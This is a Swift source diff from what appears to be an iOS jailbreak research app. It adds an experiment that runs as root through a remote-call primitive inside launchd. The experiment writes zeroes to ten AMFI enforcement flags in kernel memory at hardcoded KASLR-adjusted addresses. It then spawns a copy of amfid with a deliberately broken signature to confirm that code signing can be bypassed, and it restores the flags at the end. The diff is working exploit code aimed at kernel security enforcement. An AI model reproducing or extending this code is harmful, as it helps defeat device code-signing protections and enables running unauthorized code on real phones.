@@ -904,6 +904,16 @@ struct AMFIExperimentView: View {
                 )
 
                 pathButton(
+                    title: "③o6 Spawn Test (Exp 93f)",
+                    icon: "play.circle.fill",
+                    color: .red,
+                    label: "Spawn Test",
+                    action: runExp93fSpawnTest,
+                    needsVerified: true,
+                    needsProbe: false
+                )
+
+                pathButton(
                     title: "③p Heap TC Scan (Exp 94)",
                     icon: "magnifyingglass.circle",
                     color: .orange,
@@ -8328,6 +8338,294 @@ struct AMFIExperimentView: View {
         RootExecutor.rcall(rc, "free", proofPathAddr)
 
         return ExperimentResult(name: expName, success: jailbroken || (childSignal == 0 && childCode == 0), detail: detail, timestamp: Date())
+    }
+
+    // MARK: - Exp 93f: posix_spawn Definitive (flags ON vs OFF)
+
+    /// Exp 93f: The REAL test. fork() via RC is broken (child never execve's).
+    /// Only posix_spawn actually launches a new process from RC context.
+    /// Compare posix_spawn result WITH vs WITHOUT AMFI flags disabled.
+    /// If ret changes from non-zero to 0 → AMFI flags control enforcement.
+    private func runExp93fSpawnTest() {
+        isRunning = true
+        runningLabel = "Spawn Test"
+        guard mgr.dsready, PhysmapConstants.isVerified else {
+            isRunning = false
+            runningLabel = ""
+            return
+        }
+        #if !DISABLE_REMOTECALL
+        root.executeAsRoot(operation: "exp93f_spawn_test") { rc in
+            let result = self.expSpawnTest(rc: rc)
+            DispatchQueue.main.async {
+                self.results.insert(result, at: 0)
+                self.isRunning = false
+                self.runningLabel = ""
+            }
+            return (result.success, result.detail.prefix(80).description, 0)
+        }
+        #else
+        isRunning = false
+        runningLabel = ""
+        #endif
+    }
+
+    private func expSpawnTest(rc: RemoteCall) -> ExperimentResult {
+        let expName = "Spawn Test (Exp 93f)"
+        var detail = "Experiment 93f: posix_spawn — Flags ON vs OFF\n"
+        detail += "===============================================\n\n"
+        detail += "KEY INSIGHT: fork()+execve via RC is BROKEN.\n"
+        detail += "Child never actually execve's — RC stays in parent.\n"
+        detail += "Only posix_spawn creates a real new process.\n\n"
+
+        let kernBase = ds_get_kernel_base()
+        let slide = kernBase - 0xfffffff007004000
+        let amfiDataSlid = UInt64(0xfffffff00a330098) &+ slide
+        let flagOffsets: [UInt64] = [0x110, 0x160, 0x1b0, 0x200, 0x250, 0x2a0, 0x2f0, 0x340, 0x398, 0x408]
+        let mem = rc.trojanMem
+
+        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
+        detail += "KASLR slide: 0x\(String(format: "%llx", slide))\n\n"
+
+        // ============================================================
+        // Step 1: Prepare test binaries
+        // ============================================================
+        detail += "=== Step 1: Prepare binaries ===\n"
+
+        // A) Copy /usr/libexec/amfid to /var/tmp (trusted CDHash)
+        let trustedSrc = "/usr/libexec/amfid"
+        let trustedDst = "/var/tmp/.exp93f_trusted"
+        let unsignedDst = "/var/tmp/.exp93f_unsigned"
+        let proofPath = "/var/tmp/.jb_proof"
+
+        let srcAddr = remote_alloc_str(rc, trustedSrc)
+        let trustedDstAddr = remote_alloc_str(rc, trustedDst)
+        let unsignedDstAddr = remote_alloc_str(rc, unsignedDst)
+        let proofAddr = remote_alloc_str(rc, proofPath)
+
+        // Clean up old files
+        RootExecutor.rcall(rc, "unlink", trustedDstAddr)
+        RootExecutor.rcall(rc, "unlink", unsignedDstAddr)
+        RootExecutor.rcall(rc, "unlink", proofAddr)
+
+        // Copy amfid → trusted copy (same CDHash = should pass AMFI)
+        let srcFd = RootExecutor.rcall(rc, "open", srcAddr, UInt64(O_RDONLY), 0)
+        guard srcFd != UInt64(bitPattern: -1) else {
+            detail += "❌ Cannot open \(trustedSrc)\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        let dstFd1 = RootExecutor.rcall(rc, "open", trustedDstAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
+        let buf = mem + 0x800
+        var totalCopied: UInt64 = 0
+        for _ in 0..<256 {
+            let n = RootExecutor.rcall(rc, "read", srcFd, buf, 4096)
+            if n == 0 || n == UInt64(bitPattern: -1) { break }
+            RootExecutor.rcall(rc, "write", dstFd1, buf, n)
+            totalCopied += n
+            if n < 4096 { break }
+        }
+        RootExecutor.rcall(rc, "close", srcFd)
+        RootExecutor.rcall(rc, "close", dstFd1)
+        RootExecutor.rcall(rc, "chmod", trustedDstAddr, 0o755)
+        detail += "Copied \(trustedSrc) → \(trustedDst) (\(totalCopied) bytes)\n"
+
+        // B) Copy again but patch 1 byte → unsigned (different CDHash)
+        let srcFd2 = RootExecutor.rcall(rc, "open", srcAddr, UInt64(O_RDONLY), 0)
+        let dstFd2 = RootExecutor.rcall(rc, "open", unsignedDstAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
+        var totalCopied2: UInt64 = 0
+        for _ in 0..<256 {
+            let n = RootExecutor.rcall(rc, "read", srcFd2, buf, 4096)
+            if n == 0 || n == UInt64(bitPattern: -1) { break }
+            RootExecutor.rcall(rc, "write", dstFd2, buf, n)
+            totalCopied2 += n
+            if n < 4096 { break }
+        }
+        RootExecutor.rcall(rc, "close", srcFd2)
+        RootExecutor.rcall(rc, "close", dstFd2)
+
+        // Patch byte to invalidate CDHash
+        let patchFd = RootExecutor.rcall(rc, "open", unsignedDstAddr, UInt64(O_RDWR), 0)
+        if patchFd != UInt64(bitPattern: -1) {
+            // Patch at offset 0x100 (well into __TEXT, will change CDHash)
+            RootExecutor.rcall(rc, "lseek", patchFd, 0x100, 0)
+            rc[buf].setValue8(0xFF)
+            RootExecutor.rcall(rc, "write", patchFd, buf, 1)
+            RootExecutor.rcall(rc, "close", patchFd)
+        }
+        RootExecutor.rcall(rc, "chmod", unsignedDstAddr, 0o755)
+        detail += "Copied + patched → \(unsignedDst) (\(totalCopied2) bytes, CDHash INVALID)\n\n"
+
+        // ============================================================
+        // Step 2: posix_spawn tests — FLAGS ON (baseline)
+        // ============================================================
+        detail += "=== Step 2: posix_spawn baseline (flags ON) ===\n\n"
+
+        // Test A: spawn trusted copy
+        let (retA, pidA, errA) = doSpawn(rc: rc, path: trustedDst, mem: mem)
+        detail += "[A] posix_spawn(\(trustedDst)):\n"
+        detail += "    ret=\(retA), pid=\(pidA), errno=\(errA)\n"
+        if retA == 0 && pidA != 0 {
+            let (sig, code) = doWait(rc: rc, pid: pidA, mem: mem)
+            detail += "    exit: signal=\(sig), code=\(code)\n"
+        }
+        detail += "\n"
+
+        // Test B: spawn unsigned copy
+        let (retB, pidB, errB) = doSpawn(rc: rc, path: unsignedDst, mem: mem)
+        detail += "[B] posix_spawn(\(unsignedDst)):\n"
+        detail += "    ret=\(retB), pid=\(pidB), errno=\(errB)\n"
+        if retB == 0 && pidB != 0 {
+            let (sig, code) = doWait(rc: rc, pid: pidB, mem: mem)
+            detail += "    exit: signal=\(sig), code=\(code)\n"
+        }
+        detail += "\n"
+
+        // Test C: spawn original amfid path
+        let (retC, pidC, errC) = doSpawn(rc: rc, path: trustedSrc, mem: mem)
+        detail += "[C] posix_spawn(\(trustedSrc)):\n"
+        detail += "    ret=\(retC), pid=\(pidC), errno=\(errC)\n"
+        if retC == 0 && pidC != 0 {
+            let (sig, code) = doWait(rc: rc, pid: pidC, mem: mem)
+            detail += "    exit: signal=\(sig), code=\(code)\n"
+        }
+        detail += "\n"
+
+        // ============================================================
+        // Step 3: Disable AMFI flags
+        // ============================================================
+        detail += "=== Step 3: Disable AMFI flags ===\n"
+        var originalValues: [(offset: UInt64, value: UInt64)] = []
+        for off in flagOffsets {
+            let addr = amfiDataSlid &+ off
+            let val = ds_kread64_safe(addr)
+            originalValues.append((off, val))
+            ds_kwrite64(addr, 0)
+        }
+        detail += "All 10 flags set to 0\n\n"
+
+        // ============================================================
+        // Step 4: posix_spawn tests — FLAGS OFF
+        // ============================================================
+        detail += "=== Step 4: posix_spawn (flags OFF) ===\n\n"
+
+        // Test D: spawn trusted copy (flags off)
+        let (retD, pidD, errD) = doSpawn(rc: rc, path: trustedDst, mem: mem)
+        detail += "[D] posix_spawn(\(trustedDst), flags OFF):\n"
+        detail += "    ret=\(retD), pid=\(pidD), errno=\(errD)\n"
+        if retD == 0 && pidD != 0 {
+            let (sig, code) = doWait(rc: rc, pid: pidD, mem: mem)
+            detail += "    exit: signal=\(sig), code=\(code)\n"
+        }
+        detail += "\n"
+
+        // Test E: spawn UNSIGNED copy (flags off) — THE KEY TEST
+        let (retE, pidE, errE) = doSpawn(rc: rc, path: unsignedDst, mem: mem)
+        detail += "[E] posix_spawn(\(unsignedDst), flags OFF):\n"
+        detail += "    ret=\(retE), pid=\(pidE), errno=\(errE)\n"
+        var unsignedExecOK = false
+        if retE == 0 && pidE != 0 {
+            let (sig, code) = doWait(rc: rc, pid: pidE, mem: mem)
+            detail += "    exit: signal=\(sig), code=\(code)\n"
+            if sig != 9 { unsignedExecOK = true }
+        }
+        detail += "\n"
+
+        // Test F: spawn original path (flags off)
+        let (retF, pidF, errF) = doSpawn(rc: rc, path: trustedSrc, mem: mem)
+        detail += "[F] posix_spawn(\(trustedSrc), flags OFF):\n"
+        detail += "    ret=\(retF), pid=\(pidF), errno=\(errF)\n"
+        if retF == 0 && pidF != 0 {
+            let (sig, code) = doWait(rc: rc, pid: pidF, mem: mem)
+            detail += "    exit: signal=\(sig), code=\(code)\n"
+        }
+        detail += "\n"
+
+        // ============================================================
+        // Step 5: Restore flags
+        // ============================================================
+        detail += "=== Step 5: Restore flags ===\n"
+        for (off, origVal) in originalValues {
+            ds_kwrite64(amfiDataSlid &+ off, origVal)
+        }
+        detail += "Restored\n\n"
+
+        // Cleanup
+        RootExecutor.rcall(rc, "unlink", trustedDstAddr)
+        RootExecutor.rcall(rc, "unlink", unsignedDstAddr)
+        RootExecutor.rcall(rc, "unlink", proofAddr)
+        RootExecutor.rcall(rc, "free", srcAddr)
+        RootExecutor.rcall(rc, "free", trustedDstAddr)
+        RootExecutor.rcall(rc, "free", unsignedDstAddr)
+        RootExecutor.rcall(rc, "free", proofAddr)
+
+        // ============================================================
+        // VERDICT
+        // ============================================================
+        detail += "=== VERDICT ===\n\n"
+        detail += "Summary:\n"
+        detail += "  Trusted copy (flags ON):  ret=\(retA)\n"
+        detail += "  Unsigned copy (flags ON): ret=\(retB)\n"
+        detail += "  Trusted copy (flags OFF): ret=\(retD)\n"
+        detail += "  Unsigned copy (flags OFF): ret=\(retE)\n\n"
+
+        if retB != 0 && retE == 0 && unsignedExecOK {
+            detail += "🎉🎉🎉 JAILBREAK CONFIRMED! 🎉🎉🎉\n\n"
+            detail += "Unsigned binary BLOCKED with flags ON (ret=\(retB))\n"
+            detail += "Unsigned binary ALLOWED with flags OFF (ret=\(retE))!\n"
+            detail += "AMFI flags control code signing enforcement!\n"
+        } else if retA != 0 && retD == 0 {
+            detail += "⚠️ Flags affect trusted binary spawn too.\n"
+            detail += "posix_spawn fails for ALL binaries in /var/tmp (flags ON)\n"
+            detail += "but works with flags OFF. Flags control spawn permission.\n"
+            if retE == 0 {
+                detail += "\n🎉 AND unsigned binary also works with flags OFF!\n"
+            }
+        } else if retA != 0 && retB != 0 && retD != 0 && retE != 0 {
+            detail += "❌ posix_spawn fails for ALL cases.\n"
+            detail += "ret=\(retA)/\(retB)/\(retD)/\(retE)\n"
+            detail += "posix_spawn from launchd RC has a fundamental issue.\n"
+            detail += "Might need posix_spawnattr or different approach.\n\n"
+            detail += "NOTE: This doesn't mean AMFI blocks — posix_spawn\n"
+            detail += "might fail for other reasons (sandbox, path, attrs).\n"
+        } else if retA == 0 && retB == 0 {
+            detail += "⚠️ BOTH trusted and unsigned work with flags ON!\n"
+            detail += "AMFI doesn't block copied binaries from /var/tmp.\n"
+            detail += "The CDHash patch might not actually change the hash\n"
+            detail += "(patch at wrong offset?), OR launchd bypasses AMFI.\n"
+        } else {
+            detail += "Mixed results — need more analysis.\n"
+            detail += "Trusted ON=\(retA), Unsigned ON=\(retB)\n"
+            detail += "Trusted OFF=\(retD), Unsigned OFF=\(retE)\n"
+        }
+
+        return ExperimentResult(name: expName, success: (retE == 0 && retB != 0) || unsignedExecOK, detail: detail, timestamp: Date())
+    }
+
+    /// Helper: posix_spawn and return (ret, pid, errno)
+    private func doSpawn(rc: RemoteCall, path: String, mem: UInt64) -> (Int64, UInt32, Int32) {
+        let pathAddr = remote_alloc_str(rc, path)
+        let argvBase = mem + 0x500
+        rc[argvBase].setValue64(pathAddr)
+        rc[argvBase + 8].setValue64(0)
+        let pidAddr = mem + 0x480
+        rc[pidAddr].setValue32(0)
+
+        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, pathAddr, 0, 0, argvBase, 0)
+        let pid = rc[pidAddr].value32()
+        let err = remote_errno(rc)
+
+        RootExecutor.rcall(rc, "free", pathAddr)
+        return (Int64(bitPattern: ret), pid, err)
+    }
+
+    /// Helper: waitpid and return (signal, exitcode)
+    private func doWait(rc: RemoteCall, pid: UInt32, mem: UInt64) -> (Int32, Int32) {
+        let statusAddr = mem + 0x490
+        rc[statusAddr].setValue32(0)
+        RootExecutor.rcall(rc, "waitpid", UInt64(pid), statusAddr, 0)
+        let st = rc[statusAddr].value32()
+        return (Int32(st & 0x7F), Int32(st >> 8))
     }
 
     // MARK: - Exp 93c Helpers
